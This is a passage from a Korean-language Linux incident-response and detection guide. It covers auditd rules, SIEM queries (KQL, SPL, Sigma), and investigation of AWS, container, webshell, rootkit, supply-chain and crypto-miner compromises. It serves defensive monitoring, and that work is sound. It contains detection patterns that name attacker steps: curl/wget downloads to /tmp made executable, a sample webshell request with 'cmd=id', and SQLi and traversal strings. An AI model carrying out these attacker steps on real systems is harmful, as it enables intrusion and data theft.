type=PATH ... name="/usr/bin/curl" inode=...
```

### PROCTITLE
전체 command line이 hex 형태로 저장될 수 있다.

`ausearch`는 같은 serial을 자동으로 묶어 보는 데 유용하다.

---

## 3. `ausearch` / `aureport`

```bash
# 특정 UID
ausearch -ua 1001 --start today

# 실행 파일
ausearch -x /usr/bin/curl --start today

# 감사 key
ausearch -k ssh_key_change --start today

# EXECVE 레코드
ausearch -m EXECVE --start today

# 인증 실패
ausearch -m USER_AUTH -sv no --start today

# sudoers 접근
ausearch -f /etc/sudoers --start today
```

요약:
```bash
aureport --auth --summary
aureport --auth --failed
aureport --cmd --summary
aureport --file --summary
aureport --user --summary
aureport --anomaly --start today
```

---

## 4. 파일 감시 규칙

> 규칙 추가는 시스템 상태 변경이다. 운영 적용 전 로그량을 검토한다.

```text
-w /etc/passwd -p wa -k identity
-w /etc/group -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/sudoers -p wa -k sudoers
-w /etc/sudoers.d -p wa -k sudoers
-w /etc/ssh/sshd_config -p wa -k sshd_config
```

SSH key 예:
```bash
auditctl -w /home/deploy/.ssh/authorized_keys -p wa -k ssh_key_change
```

권한 문자:
```text
r = read
w = write
x = execute
a = attribute change
```

---

## 5. syscall 감사 예시

```text
-a always,exit -F arch=b64 -S execve -k exec_log
-a always,exit -F arch=b64 -S chmod -S fchmod -S fchmodat -k perm_change
-a always,exit -F arch=b64 -S chown -S fchown -S fchownat -k owner_change
-a always,exit -F arch=b64 -S setuid -S setreuid -S setresuid -k uid_change
```

모듈 로드:
```text
-a always,exit -F arch=b64 -S init_module -S finit_module -S delete_module -k modules
```

> `connect` 전수 감사는 환경에 따라 매우 많은 로그를 만들 수 있으므로 실제 적용은 서버 역할과 수집 용량을 고려한다.

---

## 6. 규칙 영구 적용

보통:
```text
/etc/audit/rules.d/*.rules
```

로드:
```bash
augenrules --load
auditctl -l
```

규칙 잠금 설정을 사용하는 환경에서는 변경 전 운영 절차가 필요하다.

---

## 7. 핵심 감사 대상

### Identity
```text
/etc/passwd
/etc/group
/etc/shadow
```

### Privilege
```text
/etc/sudoers
/etc/sudoers.d/
SUID/SGID 및 chmod/chown
```

### SSH
```text
/etc/ssh/sshd_config
/root/.ssh/authorized_keys
/home/*/.ssh/authorized_keys
```

### Persistence
```text
/etc/cron.*
/var/spool/cron
/etc/systemd/system
```

### Kernel/rootkit 관련
```text
module load/unload
insmod/modprobe/rmmod
```

---

## 8. FIM(File Integrity Monitoring)

핵심 감시:
```text
/etc/passwd /etc/shadow /etc/group
/etc/ssh/* ~/.ssh/authorized_keys
/etc/sudoers /etc/sudoers.d/*
/etc/cron.* /var/spool/cron
/etc/systemd/system
/bin /sbin /usr/bin /usr/sbin
/var/www/html
```

### AIDE
```bash
aide --check 2>&1 | grep -Ei 'changed|added|removed'
```

### auditd
실시간 변경 사용자까지 추적 가능.

### Wazuh/OSSEC
FIM + 로그 분석 + alert 연계에 활용 가능.

---

## 9. SELinux

모드:
```bash
getenforce
sestatus
```

```text
Enforcing  = 정책 위반 차단 + 로그
Permissive = 차단하지 않고 로그
Disabled   = 비활성
```

AVC 로그:
```bash
grep 'avc: *denied' /var/log/audit/audit.log | tail -50
ausearch -m AVC --start today
```

분석 필드:
- `comm`: 요청 프로세스
- `{ write }`, `{ read }`: 시도 권한
- `scontext`: 프로세스 보안 컨텍스트
- `tcontext`: 대상 컨텍스트
- `tclass`: 객체 유형
- `permissive=0`: enforcing에서 차단

예를 들어 웹 프로세스가 평소 접근하지 않는 사용자 홈/임시 파일을 읽거나 쓰려 한 AVC는 웹쉘/침해 조사 단서가 될 수 있다.

---

## 10. AppArmor

상태:
```bash
aa-status
apparmor_status 2>/dev/null
```

프로파일:
```text
/etc/apparmor.d/
```

모드:
```text
enforce  = 차단 + 로그
complain = 허용 + 로그
```

거부 이벤트:
```bash
grep -Ei 'apparmor="DENIED"|APPARMOR_DENIED' /var/log/syslog /var/log/audit/audit.log 2>/dev/null
```

분석 필드:
- profile
- operation
- name/path
- pid/comm
- requested_mask / denied_mask

---

## 11. MAC 이벤트 triage

```text
1. 실제 차단인가, permissive/complain 로그인가
2. 어떤 프로세스가 무엇에 접근했는가
3. 정상 업데이트/배포 이후 정책 불일치인가
4. 웹/서비스 계정이 /tmp, user home, shell 파일 등에 접근했는가
5. 같은 시각 auditd execve와 네트워크 연결이 있는가
```

SELinux/AppArmor 거부 이벤트 자체만으로 공격을 확정하지 않는다. 정상 정책 미조정도 빈번하다.


---

## 07. SIEM 탐지 룰 · UEBA · 로그 품질

## 1. 우선 구현할 Linux 탐지 유스케이스

1. 동일 IP에서 다수 SSH 실패 후 10분 내 성공
2. 신규 외부 IP에서 root/admin 로그인
3. 야간 privileged 로그인 + sudo
4. `curl/wget → /tmp → chmod +x → 실행`
5. root cron에 외부 URL
6. `authorized_keys` 변경 후 publickey 로그인
7. `useradd → sudo/wheel → systemctl enable`
8. `/tmp`, `/dev/shm` 실행 + 외부 연결
9. 로그/history 삭제
10. 민감 파일 접근 → 압축/외부 전송

---

## 2. 탐지 룰 기본 필드

최소 정규화:
```text
@timestamp
host / asset_id
user / uid / auid / euid
src_ip / src_port
dst_ip / dst_port
process_name / process_path
parent_process
command_line
file_path
event_action / outcome
```

상관분석에 필요한 추가 메타데이터:
- 계정 유형: 일반/관리자/서비스
- 자산 중요도와 역할
- Bastion/VPN/관리망 IP 목록
- 승인 작업/변경 티켓
- 내부 저장소/배포 서버 목록

---

## 3. 룰 설계 요소

```text
Selection      어떤 이벤트인가
Aggregation    몇 회인가
Time window    몇 분/시간 내인가
Sequence       어떤 순서인가
Exception      정상 Bastion/서비스계정/배포 서버인가
Severity       영향도/신뢰도
Playbook       다음 분석·조치가 무엇인가
```

단순 문자열 탐지보다 sequence 탐지가 신뢰도가 높다.

```text
Failed SSH × N
→ Accepted SSH
→ sudo root
→ curl/wget
→ chmod +x
→ outbound
```

---

## 4. UEBA 관점

### 시간 이상
- 평소 주간 계정이 새벽 로그인

### 위치/네트워크 이상
- 기존 관리망이 아닌 신규 출발지

### 행동 이상
- 배치 서비스 계정이 `sudo`, `ssh`, `curl`, `bash`

### 자산 이상
- DB 서버에서 `useradd`
- 웹 서버에서 내부 대역 `nmap`

### 데이터 접근 이상
- 업무 외 시간 민감 경로 접근
- 대량 `find`, `tar`, `scp`

주의:
- baseline이 약하면 오탐이 폭증한다.
- 새 직원, 장애 대응, 배포 같은 정상 변화도 이상치로 나타난다.

---

## 5. 로그 품질이 탐지 품질을 결정한다

### 시간 동기화
```bash
timedatectl status
date && date -u
chronyc tracking 2>/dev/null || ntpq -p 2>/dev/null
```

### 파싱 검증
샘플 raw 로그와 SIEM 필드를 비교:
```text
raw user     == parsed user ?
raw src IP   == source.ip ?
COMMAND=...  == process.command_line ?
hostname     == asset inventory ?
```

### 수집 파이프라인
```text
수집 → 파싱/정규화 → 메타데이터 보강 → 탐지 → triage/SOAR
```

탐지 문제처럼 보여도 실제 원인은:
- 로그 미수집
- parser mismatch
- timezone 오류
- hostname 불일치
- rotation 파일 누락
- agent backlog
일 수 있다.

---

## 6. Elastic/KQL 예시

> 실제 필드명은 ECS/수집 파서에 맞춰 조정한다.

외부 SSH 성공:
```text
process.name : "sshd" and message : "Accepted" and not source.ip : (10.0.0.0/8 or 172.16.0.0/12 or 192.168.0.0/16)
```

신규 사용자 생성 후보:
```text
process.name : ("useradd" or "usermod")
```

SSH key 변경:
```text
file.path : *authorized_keys and event.action : (creation or change or modification)
```

curl/wget 실행:
```text
process.name : (curl or wget)
```

---

## 7. Splunk SPL 예시

### 실패 IP 상위
```spl
index=linux_auth "Failed password"
| rex "from (?<src_ip>\\S+)"
| stats count by src_ip
| sort - count
| head 20
```

### sudo 명령 빈도
```spl
index=linux_auth "sudo:" "COMMAND="
| rex "USER=(?<target_user>\\S+)\\s*;\\s*COMMAND=(?<cmd>.*)"
| stats count by user target_user cmd
| sort - count
```

### 야간 성공 로그인
```spl
index=linux_auth "Accepted"
| eval hour=tonumber(strftime(_time,"%H"))
| where hour<6 OR hour>=22
| table _time host user src_ip _raw
```

### 실패 후 성공: 개념 예시
```spl
index=linux_auth ("Failed password" OR "Accepted password" OR "Accepted publickey")
| rex "from (?<src_ip>\\S+)"
| eval outcome=if(match(_raw,"Accepted"),"success","failure")
| stats values(outcome) as outcomes count by src_ip user
| where mvfind(outcomes,"failure")>=0 AND mvfind(outcomes,"success")>=0
```

> 실제 운영 룰은 시간창과 이벤트 순서를 명시해 sequence/correlation으로 구현하는 것이 좋다.

---

## 8. Sigma 룰 사고방식

```yaml
title: Suspicious SSH Failure Then Success
status: experimental
logsource:
  product: linux
  service: sshd
detection:
  failure:
    message|contains: 'Failed password'
  success:
    message|contains: 'Accepted'
  condition: failure or success
level: medium
```

Sigma 자체는 "20회 실패 후 10분 내 성공" 같은 복잡한 상관 조건을 SIEM 백엔드 특성에 맞춰 보완해야 할 수 있다.

중요한 것은 룰 이름보다 필드 정규화와 예외 처리가 일관적인가이다.

---

## 9. Grok 파싱 예시

SSH 성공:
```text
%{SYSLOGTIMESTAMP:timestamp} %{HOSTNAME:host} sshd\[%{POSINT:pid}\]: Accepted %{WORD:auth_method} for %{USERNAME:username} from %{IP:src_ip} port %{POSINT:src_port}
```

sudo:
```text
%{USERNAME:username} : TTY=%{DATA:tty} ; PWD=%{DATA:pwd} ; USER=%{USERNAME:target_user} ; COMMAND=%{GREEDYDATA:command}
```

운영에서는 실제 샘플 로그 여러 형태를 대상으로 파서 테스트가 필요하다.

---

## 10. SOAR 자동화 경계

자동화 적합:
- IP reputation/TI 조회
- 내부/외부/Bastion 태깅
- 계정·자산 중요도 보강
- 최근 SSH/sudo/cron 관련 로그 수집
- 티켓 생성과 evidence 첨부

사람 검토가 필요한 조치:
- 계정 잠금
- 세션 강제 종료
- 방화벽 차단
- 호스트 격리
- 운영 서버 서비스 중단

---

## 11. 대시보드 구성

### 1층: 상태
- 시간별 SSH 성공/실패
- 실패 상위 IP
- privileged 성공 로그인
- 신규 출발지 로그인

### 2층: 행위
- sudo 상위 명령
- `/tmp`/`/dev/shm` 실행
- 신규 계정/서비스/cron
- auditd 고위험 key
- outbound/C2 후보

### 3층: 품질
- agent heartbeat
- ingest lag
- parser failure
- NTP/timezone mismatch
- host별 auditd 수집량

---

## 12. 오탐 줄이는 질문

```text
이 IP는 Bastion/배포 서버인가?
이 계정은 원래 이 호스트에 접속하는가?
이 명령은 과거에도 반복되는가?
내부 artifact repository에서 받은 파일인가?
change ticket / maintenance window와 일치하는가?
이 프로세스가 원래 외부 연결하는가?
```

**행위 + 맥락 + 시퀀스**를 함께 만족할수록 severity를 높인다.


---

## 08. 특수 환경: AWS · 컨테이너 · 웹 · Rootkit · 공급망 · Miner

## 1. AWS EC2 사고 분석

Linux 호스트 로그만 보지 말고 AWS control plane/network 로그와 결합한다.

### CloudTrail
확인 대상:
- IAM API 호출
- EC2 시작/중지
- Security Group 변경
- Role/Policy 변경
- 액세스 키·세션 관련 행위

### VPC Flow Logs
확인:
- 의심 외부 destination
- 비정상 outbound
- 내부 lateral movement 후보

### Systems Manager Session Manager
SSH가 아닌 관리 세션이 있을 수 있으므로 SSM 접근 이력도 확인한다.

### Instance Role / Metadata
EC2의 instance profile 자격증명은 침해 후 다른 AWS 서비스 접근에 악용될 수 있다.

분석 흐름:
```text
Linux auth/auditd
↔ CloudTrail IAM/API
↔ VPC Flow Logs
↔ SSM Session
```

핵심 질문:
- 서버 침해가 AWS IAM 권한 침해로 확장되었는가
- 해당 role로 접근 가능한 S3/Secrets/KMS 등의 범위는 어디까지인가

---

## 2. Docker 환경

컨테이너 로그:
```bash
docker logs <container-id>
docker logs --since 1h <container-id>
```

이벤트:
```bash
docker events --since 1h
```

현재 컨테이너:
```bash
docker ps --no-trunc
```

확인:
- `docker exec`로 shell 접근
- `--privileged`
- host filesystem mount
- container 삭제로 로그가 사라졌는가
- 호스트 auditd/daemon 로그에 생성·exec 흔적이 있는가

> 컨테이너의 root와 호스트 root는 원칙적으로 다르지만 privileged/mount/취약점 맥락에서는 host 침해 가능성을 확인한다.

---

## 3. Kubernetes 환경

애플리케이션 로그:
```bash
kubectl logs <pod>
kubectl logs <pod> -c <container> --since=1h
kubectl logs <pod> --previous
```

컨테이너 shell:
```bash
kubectl exec -it <pod> -- /bin/sh
```

조사 시:
- Kubernetes API audit log의 `exec`, `create pod`, `patch`, `secret access`
- ServiceAccount 권한
- privileged pod / hostPath / hostNetwork
- pod 삭제 전 로그 중앙 수집 여부

호스트의 `auth.log`만으로 `kubectl exec` 전체를 파악하기 어렵기 때문에 Kubernetes audit 로그가 중요하다.

---

## 4. 웹 서버 접근 로그

nginx 예:
```text
198.51.100.5 - - [12/Jan/2024:03:15:20 +0900] "GET /wp-admin/... HTTP/1.1" 404 ...
```

고위험 흐름:
```text
POST /uploads/shell.php 200
→ GET /uploads/shell.php?cmd=id 200
→ nginx/php-fpm → sh/bash → curl
```

4xx 분포:
```bash
awk '{print $9}' /var/log/nginx/access.log | sort | uniq -c | sort -rn
```

공격 패턴 후보:
- traversal: `../`, `%2e%2e`
- SQLi: `UNION SELECT`, `OR 1=1`
- LFI: `/etc/passwd`, `/proc/self/...`
- 짧은 시간의 다수 404/403

웹 로그와 host process/auditd를 연결하는 것이 핵심이다.

---

## 5. Rootkit / 은닉

유형:
- 커널 rootkit: LKM 등으로 커널 수준 은닉
- user-space rootkit: 라이브러리/도구 후킹
- bootkit: bootloader 영역

도구:
```bash
rkhunter --check --skip-keypress
chkrootkit
lsmod
```

현재 모듈:
```bash
lsmod
cat /proc/modules
```

확인:
- 모듈 로드 시점
- `insmod`, `modprobe`, `init_module` audit 이벤트
- `ps/ss/ls` 결과와 `/proc`, EDR 관측의 불일치
- `LD_PRELOAD` 이상

> rootkit 탐지는 단일 스캐너 결과로 확정하지 않고 무결성 기준·메모리/EDR·known-good 시스템과 비교한다.

---

## 6. 공급망 공격

경로:
- apt/pip/npm 등 패키지 변조
- CI/CD 배포 스크립트 변조
- 배포 서버 침해 후 다수 서버 전파

Linux 탐지 관점:
```text
배포 직후 여러 서버에서 동일 시간대 동일 명령
설치 스크립트 직후 curl/wget 외부 연결
배포 대상이 아닌 서버까지 같은 IOC
패키지 설치 프로세스 하위에서 shell/network tool 실행
```

핵심은 단일 서버가 아니라 **fleet-wide 동시성**이다.

---

## 7. Crypto Miner

의심 패턴:
```text
/tmp 또는 /dev/shm 실행 파일
nohup + /dev/null
cron 지속성
CPU 장시간 고사용
마이닝 풀/stratum 연결
```

프로세스:
```bash
top
ps aux --sort=-%cpu | head -20
```

의심 문자열 후보:
```bash
ps auxww | grep -Ei 'xmrig|minerd|minergate' | grep -v grep
```

네트워크:
```bash
ss -tnp
```

확인:
- CPU만 높다고 miner로 확정하지 않는다.
- 실행 경로, parent, command line, destination, cron을 함께 본다.

---

## 8. 웹/컨테이너/클라우드 공통 사고 질문

```text
초기 접근점은 어디인가?
호스트 권한으로 확장되었는가?
자격증명/토큰/Instance Role이 유출되었는가?
다른 서버·Pod·AWS 서비스로 이동했는가?
로그가 호스트 외 중앙 저장소에 남아 있는가?
같은 이미지/패키지/배포물로 다른 자산도 영향받았는가?
```

이 질문으로 host 단위 분석을 환경 전체 영향도 분석으로 확장한다.
